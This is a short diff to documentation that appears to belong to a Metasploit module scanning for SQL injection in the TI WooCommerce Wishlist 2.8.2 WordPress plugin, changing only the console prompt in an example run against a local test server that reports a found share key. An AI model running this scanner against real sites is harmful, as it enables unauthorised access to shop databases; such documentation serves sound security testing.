@@ -121,7 +121,7 @@ installation running **TI WooCommerce Wishlist 2.8.2** with **WooCommerce** in a
 ### Step-by-step Scenario
 
 ```bash
-msf6 auxiliary(scanner/http/wp_ti_woocommerce_wishlist_sqli) > run http://127.0.0.1:5555
+msf auxiliary(scanner/http/wp_ti_woocommerce_wishlist_sqli) > run http://127.0.0.1:5555
 
 [*] Testing Product IDs from 0 to 100, please wait...
 [+] Share key found: e93cca
